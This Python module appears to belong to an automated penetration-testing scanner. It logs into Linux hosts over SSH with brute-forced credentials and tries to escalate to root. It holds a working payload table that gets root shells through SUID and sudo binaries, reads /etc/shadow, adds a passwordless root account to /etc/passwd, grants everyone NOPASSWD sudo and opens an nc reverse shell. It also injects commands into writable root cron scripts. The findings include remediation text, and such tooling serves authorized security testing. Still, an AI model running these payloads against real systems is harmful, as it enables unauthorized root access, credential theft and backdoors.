"""
Linux Privilege Escalation module — Phase 8.2.
Reads LinPEAS/pspy vectors from postex findings, selects best vector,
attempts exploitation via SSH session, verifies UID=0.
Vectors: SUID abuse, sudo NOPASSWD (GTFOBins), cron job hijack.
Only runs on scan_type == 'full'.
"""
from __future__ import annotations

import re
import shutil
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult
from app.scanner.post_exploit import _ssh_exec, _extract_ssh_sessions

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


# ── GTFOBins SUID payloads ────────────────────────────────────────────────────
# Maps binary name → shell command that gives root shell via that SUID binary

_GTFO_SUID: dict[str, str] = {
    "bash":        "bash -p -c 'id'",
    "sh":          "sh -p -c 'id'",
    "find":        "find . -exec /bin/sh -p \\; -quit",
    "python":      "python -c 'import os; os.setuid(0); os.system(\"id\")'",
    "python3":     "python3 -c 'import os; os.setuid(0); os.system(\"id\")'",
    "perl":        "perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/sh -p\"'",
    "ruby":        "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh -p\"'",
    "php":         "php -r 'pcntl_setuid(0); system(\"id\");'",
    "node":        "node -e 'process.setuid(0); require(\"child_process\").exec(\"id\", (_,o)=>console.log(o))'",
    "nmap":        "nmap --interactive -c '!sh'",
    "vim":         "vim -c ':py import os; os.setuid(0)' -c ':!id' -c ':q!'",
    "vi":          "vi -c ':!id' -c ':q!'",
    "less":        "less /etc/passwd; !/bin/sh",
    "more":        "more /etc/passwd; !/bin/sh",
    "awk":         "awk 'BEGIN {system(\"/bin/sh -p\")}'",
    "nano":        "nano -c /bin/sh",
    "cp":          "cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p -c id",
    "mv":          "mv /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p -c id",
    "tee":         "echo 'root2::0:0::/root:/bin/bash' | tee -a /etc/passwd && id",
    "curl":        "curl file:///etc/shadow",
    "wget":        "wget -O- file:///etc/shadow",
    "tar":         "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p",
    "zip":         "zip /tmp/a.zip /etc/passwd -T --unzip-command 'sh -c id'",
    "env":         "env /bin/sh -p",
    "strace":      "strace -o /dev/null /bin/sh -p",
    "ltrace":      "ltrace -b -L /bin/sh -p",
    "gdb":         "gdb -nx -ex 'python import os; os.setuid(0)' -ex 'python os.system(\"/bin/id\")' -ex quit",
    "man":         "man man; !/bin/sh",
    "ftp":         "ftp; !/bin/sh",
    "socat":       "socat stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane",
    "nc":          "nc -e /bin/sh 127.0.0.1 4444 &",
    "openssl":     "openssl req -x509 -newkey rsa:4096 -keyout /dev/null -out /dev/null -days 1 -nodes -subj '/' 2>&1 | head -1; openssl s_client -quiet -connect /dev/null 2>/dev/null; /bin/sh -p",
    "docker":      "docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c id",
    "lxd":         "lxc init ubuntu:18.04 privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true; lxc start privesc; lxc exec privesc -- /mnt/root/bin/sh -c id",
    "git":         "git help config; !/bin/sh",
    "python2":     "python2 -c 'import os; os.setuid(0); os.system(\"id\")'",
    "taskset":     "taskset 1 /bin/sh -p",
    "watch":       "watch -x sh -c 'id; exec sh'",
    "gcc":         "gcc -wrapper /bin/sh,-p . -o /dev/null",
    "make":        "make -s --eval=$'x:\\n\\t-'\"'\"'id'\"'\"",
    "lua":         "lua -e 'os.execute(\"/bin/sh -p\")'",
    "ed":          "ed; !/bin/sh",
    "cpulimit":    "cpulimit -l 100 -f -- /bin/sh -p",
    "ionice":      "ionice /bin/sh -p",
    "timeout":     "timeout 7d /bin/sh -p",
}

# ── GTFOBins sudo NOPASSWD payloads ──────────────────────────────────────────

_GTFO_SUDO: dict[str, str] = {
    k: v.replace("-p", "").replace("os.setuid(0); ", "")
    for k, v in _GTFO_SUID.items()
}
# Override with cleaner sudo variants
_GTFO_SUDO.update({
    "bash":    "sudo bash -c 'id'",
    "sh":      "sudo sh -c 'id'",
    "find":    "sudo find . -exec /bin/sh \\; -quit",
    "python3": "sudo python3 -c 'import os; os.system(\"id\")'",
    "vim":     "sudo vim -c ':!id' -c ':q!'",
    "less":    "sudo less /etc/passwd",
    "awk":     "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "env":     "sudo env /bin/sh",
    "tee":     "echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/pwned && sudo id",
})


# ── Vector extraction ─────────────────────────────────────────────────────────

def _extract_suid_binaries(postex_findings: list[Finding]) -> list[str]:
    """Pull SUID binary paths from linpeas findings."""
    bins: list[str] = []
    for f in postex_findings:
        if f.type != "postex" or "suid" not in (f.title or "").lower():
            continue
        m = re.search(r"(/[/\w.\-]+)", f.evidence or "")
        if m:
            bins.append(m.group(1))
    return bins


def _extract_sudo_nopasswd(postex_findings: list[Finding]) -> list[str]:
    """Pull sudo NOPASSWD binary names from linpeas findings."""
    bins: list[str] = []
    for f in postex_findings:
        if f.type != "postex" or "sudo" not in (f.title or "").lower():
            continue
        # Match binary paths like /usr/bin/vim or ALL
        for m in re.finditer(r"(/[/\w.\-]+|ALL)", f.evidence or ""):
            bins.append(m.group(1))
    return bins


def _extract_writable_crons(postex_findings: list[Finding]) -> list[str]:
    """Pull writable cron script paths from linpeas/pspy findings."""
    scripts: list[str] = []
    for f in postex_findings:
        if f.type != "postex":
            continue
        if "cron" not in (f.title or "").lower() and "cron" not in (f.evidence or "").lower():
            continue
        for m in re.finditer(r"(/[/\w.\-]+\.(?:sh|py|pl|rb))", f.evidence or ""):
            scripts.append(m.group(1))
    return scripts


# ── Exploit execution ─────────────────────────────────────────────────────────

def _binary_name(path: str) -> str:
    return path.rstrip("/").split("/")[-1].lower()


async def _try_suid_exploit(
    ctx: "ScanContext",
    host: str,
    user: str,
    password: str,
    suid_path: str,
) -> tuple[bool, str]:
    name = _binary_name(suid_path)
    payload = _GTFO_SUID.get(name)
    if not payload:
        return False, f"no GTFOBins payload for {name}"

    # Replace generic binary name with full path in payload
    payload_with_path = payload.replace(name, suid_path, 1)

    await ctx.log(f"privesc: trying SUID {suid_path} on {host}", module="privesc_linux")
    ok, output = _ssh_exec(host, user, password, payload_with_path, timeout=15)
    return ok, output


async def _try_sudo_exploit(
    ctx: "ScanContext",
    host: str,
    user: str,
    password: str,
    sudo_entry: str,
) -> tuple[bool, str]:
    name = _binary_name(sudo_entry) if sudo_entry != "ALL" else "bash"
    if sudo_entry == "ALL":
        payload = "sudo bash -c 'id'"
    else:
        payload = _GTFO_SUDO.get(name, f"sudo {sudo_entry} -c 'id'")

    await ctx.log(f"privesc: trying sudo NOPASSWD {sudo_entry} on {host}", module="privesc_linux")
    ok, output = _ssh_exec(host, user, password, payload, timeout=15)
    return ok, output


async def _try_cron_hijack(
    ctx: "ScanContext",
    host: str,
    user: str,
    password: str,
    script_path: str,
) -> tuple[bool, str]:
    """Append id command to writable cron script and wait for execution."""
    await ctx.log(f"privesc: trying cron hijack on {script_path} at {host}", module="privesc_linux")

    # Write marker + id to the script
    inject_cmd = f"echo 'id > /tmp/.privesc_proof' >> {script_path}"
    ok, _ = _ssh_exec(host, user, password, inject_cmd, timeout=10)
    if not ok:
        return False, "could not write to cron script"

    # Wait up to 65 seconds for cron to fire (minute boundary)
    import asyncio
    await ctx.log("privesc: waiting 65s for cron execution...", module="privesc_linux")
    await asyncio.sleep(65)

    ok, output = _ssh_exec(host, user, password, "cat /tmp/.privesc_proof 2>/dev/null", timeout=10)
    # Clean up
    _ssh_exec(host, user, password, "rm -f /tmp/.privesc_proof", timeout=5)
    return ok and "uid=0" in output, output


def _is_root(output: str) -> bool:
    return bool(re.search(r"uid=0\(root\)|uid=0\b", output))


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_privesc_linux(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    postex_findings: list[Finding],
    brute_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    if scan_type != "full":
        return result

    ssh_sessions = _extract_ssh_sessions(brute_findings)
    if not ssh_sessions:
        await ctx.log("privesc_linux: no SSH sessions available", level="warning", module="privesc_linux")
        return result

    suid_bins   = _extract_suid_binaries(postex_findings)
    sudo_bins   = _extract_sudo_nopasswd(postex_findings)
    cron_scripts = _extract_writable_crons(postex_findings)

    await ctx.log(
        f"privesc_linux: {len(suid_bins)} SUID, {len(sudo_bins)} sudo, {len(cron_scripts)} cron vector(s)",
        module="privesc_linux",
    )

    if not suid_bins and not sudo_bins and not cron_scripts:
        await ctx.log("privesc_linux: no escalation vectors found", module="privesc_linux")
        return result

    for host, user, password in ssh_sessions[:1]:  # one session is enough

        # 1. Try SUID abuse
        for suid_path in suid_bins[:5]:
            ok, output = await _try_suid_exploit(ctx, host, user, password, suid_path)
            if ok and _is_root(output):
                await ctx.log(f"privesc_linux: ROOT via SUID {suid_path}!", level="error", module="privesc_linux")
                result.findings.append(Finding(
                    type="postex",
                    title=f"Privilege escalation to root via SUID {_binary_name(suid_path)}",
                    severity="critical",
                    description=(
                        f"Successfully escalated to root on {target} using SUID binary "
                        f"'{suid_path}'.\n\nProof:\n{output[:400]}"
                    ),
                    evidence=f"uid=0 confirmed via SUID {suid_path}: {output[:200]}",
                    remediation=(
                        f"Remove the SUID bit from {suid_path}: `chmod u-s {suid_path}`.\n"
                        "Audit all SUID binaries with: `find / -perm -4000 -type f 2>/dev/null`.\n"
                        "Keep only absolutely necessary SUID binaries."
                    ),
                    cvss_score=9.8,
                ))
                break  # one confirmed root is enough

        if result.findings:
            break

        # 2. Try sudo NOPASSWD
        for sudo_entry in sudo_bins[:5]:
            ok, output = await _try_sudo_exploit(ctx, host, user, password, sudo_entry)
            if ok and _is_root(output):
                await ctx.log(f"privesc_linux: ROOT via sudo NOPASSWD {sudo_entry}!", level="error", module="privesc_linux")
                result.findings.append(Finding(
                    type="postex",
                    title=f"Privilege escalation to root via sudo NOPASSWD ({_binary_name(sudo_entry)})",
                    severity="critical",
                    description=(
                        f"Successfully escalated to root on {target} using sudo NOPASSWD "
                        f"for '{sudo_entry}'.\n\nProof:\n{output[:400]}"
                    ),
                    evidence=f"uid=0 confirmed via sudo {sudo_entry}: {output[:200]}",
                    remediation=(
                        f"Remove NOPASSWD from sudoers for '{sudo_entry}'.\n"
                        "Review /etc/sudoers and /etc/sudoers.d/. "
                        "Apply principle of least privilege — use `sudo -l` audit regularly."
                    ),
                    cvss_score=9.8,
                ))
                break

        if result.findings:
            break

        # 3. Try cron hijack (only if no other vector worked — slow, 65s wait)
        for script in cron_scripts[:2]:
            ok, output = await _try_cron_hijack(ctx, host, user, password, script)
            if ok:
                await ctx.log(f"privesc_linux: ROOT via cron hijack {script}!", level="error", module="privesc_linux")
                result.findings.append(Finding(
                    type="postex",
                    title=f"Privilege escalation to root via cron job hijack ({script})",
                    severity="critical",
                    description=(
                        f"Successfully escalated to root on {target} by writing to a "
                        f"cron script '{script}' executed by root.\n\nProof:\n{output[:400]}"
                    ),
                    evidence=f"uid=0 confirmed via cron hijack {script}: {output[:200]}",
                    remediation=(
                        f"Set correct ownership and permissions on {script}: "
                        f"`chown root:root {script} && chmod 700 {script}`.\n"
                        "Audit all cron jobs: `crontab -l`, `cat /etc/cron*/*`. "
                        "Ensure cron scripts are not writable by non-root users."
                    ),
                    cvss_score=9.8,
                ))
                break

    if not result.findings:
        await ctx.log("privesc_linux: no successful escalation achieved", module="privesc_linux")

    return result
